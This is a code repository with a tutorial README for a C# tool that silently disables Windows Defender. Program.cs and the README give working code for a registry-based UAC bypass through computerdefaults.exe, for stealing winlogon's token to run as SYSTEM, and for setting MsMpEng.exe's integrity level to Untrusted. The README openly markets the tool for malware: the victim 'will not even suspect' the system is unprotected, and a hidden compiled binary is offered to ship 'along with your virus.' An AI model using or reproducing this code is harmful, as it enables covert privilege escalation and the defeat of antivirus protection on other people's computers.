Project Path: arc_gmh5225_Disable-Windows-Defender-_v41m9uwv

Source Tree:

```txt
arc_gmh5225_Disable-Windows-Defender-_v41m9uwv
├── ABC
│   ├── ABC.csproj
│   ├── App.config
│   ├── Program.cs
│   ├── Properties
│   │   └── AssemblyInfo.cs
│   ├── WinApi.cs
│   ├── app.manifest
│   └── obj
│       └── Debug
│           ├── ABC.csproj.AssemblyReference.cache
│           └── DesignTimeResolveAssemblyReferencesInput.cache
├── ABC.sln
├── README.md
├── Silent.7z
└── imge
    ├── 1.png
    ├── 2.jpeg
    ├── 3.png
    ├── 4.png
    └── sys.mp4

```

`ABC.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.32413.511
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "ABC", "ABC\ABC.csproj", "{F1E836C1-2279-49B3-84CC-ED8B048FCC44}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Silent", "Silent\Silent.csproj", "{A220F564-41CB-46F5-9938-FEFD87819771}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Release|Any CPU = Release|Any CPU
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{F1E836C1-2279-49B3-84CC-ED8B048FCC44}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{F1E836C1-2279-49B3-84CC-ED8B048FCC44}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{F1E836C1-2279-49B3-84CC-ED8B048FCC44}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{F1E836C1-2279-49B3-84CC-ED8B048FCC44}.Release|Any CPU.Build.0 = Release|Any CPU
		{A220F564-41CB-46F5-9938-FEFD87819771}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{A220F564-41CB-46F5-9938-FEFD87819771}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{A220F564-41CB-46F5-9938-FEFD87819771}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{A220F564-41CB-46F5-9938-FEFD87819771}.Release|Any CPU.Build.0 = Release|Any CPU
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {8CA418B7-A4C0-4B9D-901F-2BFAF6FF2514}
	EndGlobalSection
EndGlobal

```

`ABC/ABC.csproj`:

```csproj
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{F1E836C1-2279-49B3-84CC-ED8B048FCC44}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <RootNamespace>ABC</RootNamespace>
    <AssemblyName>ABC</AssemblyName>
    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
    <Deterministic>true</Deterministic>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup>
    <ApplicationManifest>app.manifest</ApplicationManifest>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Management" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Net.Http" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="WinApi.cs" />
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config" />
    <None Include="app.manifest" />
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
</Project>
```

`ABC/App.config`:

```config
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
    </startup>
</configuration>
```

`ABC/Program.cs`:

```cs
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace ABC
{
    class Program
    {
        static void Main(string[] args)
        {
            
            Console.WriteLine("Admin privelegies: " + IsAdministrator().ToString().ToUpper());
            string owner = GetProcessOwner(Process.GetCurrentProcess().Id);
            Console.WriteLine("User: " + owner);

            if (IsAdministrator() && owner.StartsWith("NT") == false)
            {
                Console.WriteLine("Starting Elevating to SYSTEM");
                jumptoSys();
            }
            else if (IsAdministrator() && owner.StartsWith("NT"))
            {
                Console.WriteLine("Starting WD Disable");
                Disable();
            }

            Console.ReadLine();
        }

        public static void jumptoSys()
        {
            string procTostart = Assembly.GetEntryAssembly().Location;
            Process process = Process.GetProcessesByName("winlogon")[0];
            IntPtr procHandle = process.Handle;
            IntPtr tokenHandle = IntPtr.Zero;

            WinApi.OpenProcessToken(procHandle, 0x0002, out tokenHandle);

            WinApi.STARTUPINFO SINFO = new WinApi.STARTUPINFO();
            SINFO.dwFlags = 1;
            SINFO.wShowWindow = 1;

            WinApi.PROCESS_INFORMATION PINFO;

            WinApi.SECURITY_ATTRIBUTES SECA = new WinApi.SECURITY_ATTRIBUTES();

            IntPtr doubleDuplicateToken = IntPtr.Zero;

            WinApi.DuplicateTokenEx(tokenHandle, 0x2000000, ref SECA, 2, WinApi.TOKEN_TYPE.TokenPrimary, out doubleDuplicateToken); 

            WinApi.CreateProcessWithTokenW(doubleDuplicateToken, WinApi.LogonFlags.NetCredentialsOnly, null, procTostart, WinApi.CreationFlags.DefaultErrorMode, IntPtr.Zero, null, ref SINFO, out PINFO);
        }

        public static void Disable()
        {
            int pid = Process.GetProcessesByName("MsMpEng")[0].Id;

            IntPtr handleWD = WinApi.OpenProcess(WinApi.ProcessAccessFlags.QueryLimitedInformation, false, pid);

            IntPtr currentToken;
            WinApi.OpenProcessToken(handleWD, (uint)WinApi.TokenAccessFlags.TOKEN_ALL_ACCESS, out currentToken);

            WinApi.TOKEN_MANDATORY_LABEL tml = default;
            tml.Label.Sid = IntPtr.Zero;
            tml.Label.Attributes = 0x20; // SE_GROUP_INTEGRITY
            WinApi.ConvertStringSidToSid("S-1-16-0", out tml.Label.Sid);

            IntPtr tmlPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tml));
            Marshal.StructureToPtr(tml, tmlPtr, false);

            WinApi.SetTokenInformation(currentToken, WinApi.TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, tmlPtr, (uint)Marshal.SizeOf(tml));

            Console.WriteLine(@"
██████╗░███████╗███████╗███████╗███╗░░██╗██████╗░███████╗██████╗░    ░█████╗░███████╗███████╗
██╔══██╗██╔════╝██╔════╝██╔════╝████╗░██║██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝
██║░░██║█████╗░░█████╗░░█████╗░░██╔██╗██║██║░░██║█████╗░░██████╔╝    ██║░░██║█████╗░░█████╗░░
██║░░██║██╔══╝░░██╔══╝░░██╔══╝░░██║╚████║██║░░██║██╔══╝░░██╔══██╗    ██║░░██║██╔══╝░░██╔══╝░░
██████╔╝███████╗██║░░░░░███████╗██║░╚███║██████╔╝███████╗██║░░██║    ╚█████╔╝██║░░░░░██║░░░░░
╚═════╝░╚══════╝╚═╝░░░░░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝    ░╚════╝░╚═╝░░░░░╚═╝░░░░░


██╗░░██╗░██████╗░██████╗░░░██╗░██████╗
╚██╗██╔╝██╔════╝██╔════╝░░░██║██╔════╝
░╚███╔╝░╚█████╗░╚█████╗░░░░██║╚█████╗░
░██╔██╗░░╚═══██╗░╚═══██╗░░░██║░╚═══██╗
██╔╝╚██╗██████╔╝██████╔╝██╗██║██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░╚═╝╚═╝╚═════╝░");

        }

        public static bool IsAdministrator()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                    .IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static string GetProcessOwner(int processId)
        {
            string query = "Select * From Win32_Process Where ProcessID = " + processId;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
            ManagementObjectCollection processList = searcher.Get();

            foreach (ManagementObject obj in processList)
            {
                string[] argList = new string[] { string.Empty, string.Empty };
                int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
                if (returnVal == 0)
                {
                    return argList[1] + @"\" + argList[0];
                }
            }

            return "NO OWNER";
        }
    }
}

```

`ABC/Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

// General Information about an assembly is controlled through the following
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("ABC")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("ABC")]
[assembly: AssemblyCopyright("Copyright ©  2022")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible
// to COM components.  If you need to access a type in this assembly from
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("f1e836c1-2279-49b3-84cc-ed8b048fcc44")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version
//      Build Number
//      Revision
//
// You can specify all the values or you can default the Build and Revision Numbers
// by using the '*' as shown below:
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

```

`ABC/WinApi.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ABC
{
    class WinApi
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            ProcessAccessFlags dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        UInt32 DesiredAccess,
        out IntPtr TokenHandle);

        [DllImport("advapi32.dll")]
        public static extern bool DuplicateToken(
        IntPtr ExistingTokenHandle,
        int SECURITY_IMPERSONATION_LEVEL,
        ref IntPtr DuplicateTokenHandle);


        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(
        IntPtr hToken);

        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int Length;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        public enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        ref SECURITY_ATTRIBUTES lpTokenAttributes,
        int SECURITY_IMPERSONATION_LEVEL,
        TOKEN_TYPE TokenType,
        out IntPtr phNewToken);

        [DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        LogonFlags dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        CreationFlags dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

        public enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        public enum TokenAccessFlags : int
        {
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
            TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                TOKEN_ADJUST_SESSIONID)
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_MANDATORY_LABEL
        {
            public SID_AND_ATTRIBUTES Label;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public uint Attributes;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ConvertStringSidToSid(
        string StringSid,
        out IntPtr ptrSid
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern Boolean SetTokenInformation(
        IntPtr TokenHandle,
        TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation,
        UInt32 TokenInformationLength);
    }
}

```

`ABC/app.manifest`:

```manifest
<?xml version="1.0" encoding="utf-8"?>
<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1">
  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
    <security>
      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
        <!-- UAC Manifest Options
             If you want to change the Windows User Account Control level replace the 
             requestedExecutionLevel node with one of the following.

        <requestedExecutionLevel  level="asInvoker" uiAccess="false" />
        <requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />
        <requestedExecutionLevel  level="highestAvailable" uiAccess="false" />

            Specifying requestedExecutionLevel element will disable file and registry virtualization. 
            Remove this element if your application requires this virtualization for backwards
            compatibility.
        -->
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
      </requestedPrivileges>
    </security>
  </trustInfo>

  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <!-- A list of the Windows versions that this application has been tested on
           and is designed to work with. Uncomment the appropriate elements
           and Windows will automatically select the most compatible environment. -->

      <!-- Windows Vista -->
      <!--<supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}" />-->

      <!-- Windows 7 -->
      <!--<supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}" />-->

      <!-- Windows 8 -->
      <!--<supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}" />-->

      <!-- Windows 8.1 -->
      <!--<supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}" />-->

      <!-- Windows 10 -->
      <!--<supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}" />-->

    </application>
  </compatibility>

  <!-- Indicates that the application is DPI-aware and will not be automatically scaled by Windows at higher
       DPIs. Windows Presentation Foundation (WPF) applications are automatically DPI-aware and do not need 
       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should 
       also set the 'EnableWindowsFormsHighDpiAutoResizing' setting to 'true' in their app.config. 
       
       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -->
  <!--
  <application xmlns="urn:schemas-microsoft-com:asm.v3">
    <windowsSettings>
      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
      <longPathAware xmlns="http://schemas.microsoft.com/SMI/2016/WindowsSettings">true</longPathAware>
    </windowsSettings>
  </application>
  -->

  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->
  <!--
  <dependency>
    <dependentAssembly>
      <assemblyIdentity
          type="win32"
          name="Microsoft.Windows.Common-Controls"
          version="6.0.0.0"
          processorArchitecture="*"
          publicKeyToken="6595b64144ccf1df"
          language="*"
        />
    </dependentAssembly>
  </dependency>
  -->

</assembly>

```

`README.md`:

```md
# Disable-Windows-Defender-
Disable Windows Defender (+ UAC Bypass, + Upgrade to SYSTEM)

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Disable-Windows-Defender-/blob/main/imge/4.png" 
<p align="center">

<h4 align="center">CHAPTER 1: PREPARATION</h4>
<p align="center">

Let's start, as expected, with a tedious theory. Unfortunately, without it, the essence of what is happening in the future will not be clear, so I will try to tell you as briefly as possible and in an understandable language.

Privilege tokens are permissions given by the system to a process.
For example, if a process has a "SeShutdownPrivilege" token, then it has the right to turn off your computer.​
If your program does not have this token, it will not be able to perform this action.

Windows Defender uses its privileges to check files. For example, “SeRestorePlivilege".​
From this, we conclude that if you deprive the antivirus process of permission to check files, it will become useless and will not be able to perform this very check.​
​
Any explanation will become clearer if you translate it from dry text into visualization.
Actually, for this reason, I suggest you download Process Hacker and look with your own eyes at the tokens available to a particular process.

Windows Defender is responsible for the process MsMpEng.exe we need to find it in the list and open the Tokens tab​
​
Here we notice that the process has many different privileges that are of key importance to it.

As you understand, we will deal with disabling these privileges.​
This concludes the theoretical part, and we begin to implement the POC.

At the very start, we are already plagued by two problems.

- The process MsMpEng.exe launched on behalf of the System. To edit its tokens, we need to have the user “NT AUTHORITY\SYSTEM”​
- To get a SYSTEM, we will need to upgrade, which in turn occurs only from the administrator level.

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Disable-Windows-Defender-/blob/main/imge/1.png" 
<p align="center">

### we will have to restart the process as many as 2 times to get all the necessary rights.

- We get administrator rights using UAC Bypass.
- And then we get the SYSTEM level by stealing the token and starting our process with the stolen token.

Well, let's start creating it.

<h4 align="center">CHAPTER 2: RAISING THE RIGHTS</h4>
<p align="center">

### There are a lot of UAC bypass implementations, you can choose any one that suits you. In this article, I will use the most common method through registry editing.

Its essence is that the system application computerdefaults.exe , at startup, accesses regedit , in the path "Software\Classes\ms-settings\shell\open\command". Our task is to edit this item on your application.
Now at startup computerdefaults.exe our application opens, but with administrator rights. Edit the registry and add the application launch via cmd.

```
string execPath = Assembly.GetEntryAssembly().Location;

            Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
            Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command").SetValue("", execPath, RegistryValueKind.String);
            Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command").SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
            Registry.CurrentUser.Close();


            Process process = new System.Diagnostics.Process();
            ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = @"/C computerdefaults.exe";
            process.StartInfo = startInfo;
            process.Start();
```

Actually, at this stage we have already started our process on behalf of the administrator, without any warnings or icons on the icon.

<h4 align="center">CHAPTER 2.1: I AM THE SYSTEM</h4>
<p align="center">

As already mentioned, the Windows Defender process is running on behalf of NT AUTHORITY\SYSTEM. ​

We, being a normal process, cannot edit a process running on behalf of the system.​
​
We need a raise!

We will crank it through a duplicate token winlogon.exe​
Pay attention to the picture, here is the full algorithm of action.

If you explain what happened in a nutshell:
Windows has a process like winlogon, it runs with the system and is responsible for user authorization. We will duplicate the token of this process and run our own program with the stolen token.

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Disable-Windows-Defender-/blob/main/imge/2.jpeg" 
<p align="center">

- OpenProcessToken() -- Open the process token with the TOKEN_DUPLICATE access level (we get the token handle at the output)
- STARTUPINFO -- Set the parameters for starting the process
- DuplicateTokenEx() -- Duplicate the token with winlogon and write it down
- CreateProcessWithTokenW() -- Starting our process .exe with a token stolen from winlogon
- Congratulations, you are great

```
string procTostart = Assembly.GetEntryAssembly().Location;
            Process process = Process.GetProcessesByName("winlogon")[0];
            IntPtr procHandle = process.Handle;
            IntPtr tokenHandle = IntPtr.Zero;

            WinApi.OpenProcessToken(procHandle, 0x0002, out tokenHandle);

            WinApi.STARTUPINFO SINFO = new WinApi.STARTUPINFO();
            SINFO.dwFlags = 1;
            SINFO.wShowWindow = 1;

            WinApi.PROCESS_INFORMATION PINFO;

            WinApi.SECURITY_ATTRIBUTES SECA = new WinApi.SECURITY_ATTRIBUTES();

            IntPtr doubleDuplicateToken = IntPtr.Zero;

            WinApi.DuplicateTokenEx(tokenHandle, 0x2000000, ref SECA, 2, WinApi.TOKEN_TYPE.TokenPrimary, out doubleDuplicateToken);

            WinApi.CreateProcessWithTokenW(doubleDuplicateToken, WinApi.LogonFlags.NetCredentialsOnly, null, procTostart, WinApi.CreationFlags.DefaultErrorMode, IntPtr.Zero, null, ref SINFO, out PINFO);
```

### Let's make an interim result:

We forced our program to run on behalf of SYSTEM, bypassing UAC at the same time.

Let's see what happened in the real test.



https://github.com/EvilGreys/Disable-Windows-Defender-/assets/143311596/fff14f04-6d09-438b-a29a-c1d065cd77b9


Actually, as you can see in the demonstration, the initial process is started without administrator rights.

- Then, a UAC bypass is applied and a second process with elevated rights is opened
- The second process, in turn, launches the last .exe, which has both administrator rights and is run on behalf of the system.

At this point, we have fulfilled all the conditions for editing the privileges of the system process and are ready to implement disabling Windows Defender.

<h4 align="center">CHAPTER 3: DISABLING THE ANTIVIRUS</h4>
<p align="center">

Let's go back to the theoretical chapter of the article for a second and remember why we actually made all these upgrades.
Our task is to deprive the antivirus process of privileges, thanks to which it can check files for malware.​
​
There are two ways to solve this problem: Remove the entire list of privileges manually. Or set the Integrity Level to “Untrusted”.

During the tests, it was found that both of these solutions are interchangeable and will lead to the same result.​
​
Therefore” we will take the path of less resistance and set the Integrity Level “Untrusted".

### Like you in the previous steps, we will use the diagram to explain the next steps.

Actually, the algorithm of actions is as follows :

- OpenProcess() – get the handle of the process with access to “QueryLimitedInformation”
- OpenProcessToken() – Open the process token with the access level
- TOKEN_ALL_ACCESS TOKEN_MANDATORY_LABEL – fill in the structure that we will install in the process token
- ConvertStringSidToSid() – get the SID of the “ML_UNTRUSTED” parameter
- StructureToPtr() – we bring the structure into the format necessary for work
- SetTokenInformation() – Setting the “Untrusted” trust level on our process.

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Disable-Windows-Defender-/blob/main/imge/3.png" 
<p align="center">

The SID value of ”ML_UNTRUSTED" can be found in the Microsoft documentation, at the link.

https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab

Actually, this is the end of all the actions that we needed to do to remove privileges from the process.

The version of Windows Defender used is the most current at the time of writing.

<h4 align="center">results :</h4>
<p align="center">

So, let's ask ourselves the rhetorical question “What the fuck did I do that for?"

- The method of deleting WD via a script is dead. The method I presented in this article can currently be implemented without defects (!!!)
- This method does not cut the Antivirus from the system, it simply prohibits it from performing its functions. The user will not be suspicious of a sudden notification from the system about a disabled antivirus.
- The user will not see any icons on the panel. There will be no changes for him, he will not even suspect the fact that his system has been left unprotected.
- A similar trick can be tried with other Antiviruses, in the article Defender is taken as the most common.

The disadvantages of this idea:

- We need Administrator rights (as well as for other methods, but come on).
If the user has them, we work around this problem through the UAC Bypass
- Privilege tokens are re-issued to the process after the system is restarted. Therefore, if your virus remains in the system for a long time, add disabling WD to the startup

After carefully rereading the entire list of pros and cons, I come to the conclusion that this method has every chance of being used in combat.

Its main advantage is that the method is not burned by the Defender itself and will not be demolished when it hits the system.

- Disable WD.zip archive with C sources#
- Silent.a zip archive containing an already compiled .exe file that you can upload along with your virus.
It is completely invisible, runs without a console and disappears from the task manager.

In Silent.exe UAC bypass is not used, so you need to run it as an administrator.

### THE NOTE
This article is for informational purposes only. We do not encourage you to commit any hacking. Everything you do is your responsibility.

TOX : 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72 Telegram : @DevSecAS



```